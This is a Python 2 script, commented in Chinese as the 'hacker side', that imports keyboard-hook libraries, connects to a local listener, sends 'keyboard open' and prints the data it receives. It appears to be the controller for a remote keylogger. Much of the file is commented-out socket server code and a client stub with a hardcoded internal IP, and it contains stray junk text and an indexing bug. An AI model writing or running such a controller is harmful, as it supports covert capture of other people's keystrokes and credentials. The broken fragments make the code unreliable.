# -*- coding:utf-8 -*-
import socket
import sys
reload(sys)
sys.setdefaultencoding( "utf-8" )

import select
import sys
import Queue
import pythoncom 
import pyHook 


#messages = '123456789'
#黑客端
client_address= ('127.0.0.1', 30000)

# Create aTCP/IP socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

          

# Connect thesocket to the port where the server is listening

print>>sys.stderr, 'connecting to %s port %s' % client_address

sock.connect(client_address)

sock.send("keyboard open") 
sock_key = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock_key.connect(client_address)
#data = sock.recv(1024)
#print data
while(1):
    data = sock_key.recv(1024)
    if data =='' :
        continue;
    print data

# xxzxxxccvvbwhile(1):

#     data = sock.recv(1024)
#     print >>sys.stderr, '%s: received"%s"'%(sock.getsockname(), data)
#     if not data:
#         print >>sys.stderr, 'closingsocket', sock.getsockname()
#         sock.close()



# for message in messages:

#     # Send messages on both sockets

#     for s in socks:

#         print >>sys.stderr, '%s: sending"%s"' % \
#             (s.getsockname(), message)

#         s.send(message)

#     # Read responses on both sockets

#     for s in socks:

#         data = s.recv(1024)

#         print >>sys.stderr, '%s: received"%s"' % \
#             (s.getsockname(), data)

#         if not data:

#             print >>sys.stderr, 'closingsocket', s.getsockname()

#             s.close()




#---------------------SERVER

# # Create aTCP/IP socket

# server =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# server.setblocking(0)

# # Bind thesocket to the port
# server_address= ('localhost', 20000)
# print>>sys.stderr, 'starting up on %s port %s' % server_address
# server.bind(server_address)

# # Listen forincoming connections
# server.listen(5)
# # Socketsfrom which we expect to read
# inputs = [server ]
# # Sockets towhich we expect to write
# outputs = [ ]

# # Outgoingmessage queues (socket:Queue)
# message_queues= {}

# # if SERVER KEEP OPEN. EACH MSG RECEIVED BEGIN NEXT WHILE
# while inputs:
#     # Wait for at least one of the sockets tobe ready for processing
#     print >>sys.stderr, 'waiting for thenext event'
#     readable, writable, exceptional =select.select(inputs,outputs,inputs)

#     # Handle inputs
#     for s in readable:	# readble might me input data
#         if s is server:  # RECEIVE CONNECTION FOR THE FIRST TIME, GET ADDRESS
#             # A "readable" socket isready to accept a connection
#             connection, client_address =s.accept()
#             print >>sys.stderr, '  connection from', client_address
#             connection.setblocking(0)
#             inputs.append(connection)

#             # Give the connection a queue fordata we want to send
#             message_queues[connection] =Queue.Queue()

#         else:  # RECEIVE REAL MSG
#             data = s.recv(1024)
#             # received msg!
#             if data:
#                 # A readable client socket hasdata
#                 print >>sys.stderr,'  received "%s" from %s' % \
#                     (data, s.getpeername())
#                 message_queues[s].put(data)

#                 # Add output channel forresponse
#                 if s not in outputs:
#                     outputs.append(s)
                   
#             else:
#                 # Interpret empty result asclosed connection
#                 print >>sys.stderr,'  closing', client_address

#                 # Stop listening for input onthe connection
#                 if s in outputs:
#                     outputs.remove(s)

#                 inputs.remove(s)
#                 s.close()

#                 # Remove message queue
#                 del message_queues[s]

#     # Handle outputs
#     for s in writable:
#         try:            
#             next_msg = "RECEIVED!"
            
#         except Queue.Empty:
#             # No messages waiting so stopchecking for writability.
#             print >>sys.stderr, '  ', s.getpeername(), 'queue empty'
#             outputs.remove(s)
#         else:
#             print >>sys.stderr, '  sending "%s" to %s' % \
#                 (next_msg, s.getpeername())
#             s.send(next_msg)

#     # Handle "exceptional conditions"
#     for s in exceptional:
#         print >>sys.stderr, 'exceptioncondition on', s.getpeername()
#         # Stop listening for input on theconnection
#         inputs.remove(s)
#         if s in outputs:
#             outputs.remove(s)

#         s.close()

#         # Remove message queue
#         del message_queues[s]








# HOST='10.204.35.44'
# PORT=20000
# sock=[socket.socket(socket.AF_INET,socket.SOCK_STREAM),
#       socket.socket(socket.AF_INET, socket.SOCK_STREAM)]#定义socket类型，网络通信，TCP
# for s in sock:
#     s.connect((HOST,PORT))       #要连接的IP与端口
# sock[1].send("keyboard open"  )
# print (11111)
# while 1:
#        #cmd=raw_input("Please input cmd:")       #与人交互，输入命令
#             #把命令发送给对端
#        data=sock[2].recv(1024)     #把接收的数据定义为变量
#        print data         #输出变量
# s.close()   #关闭连接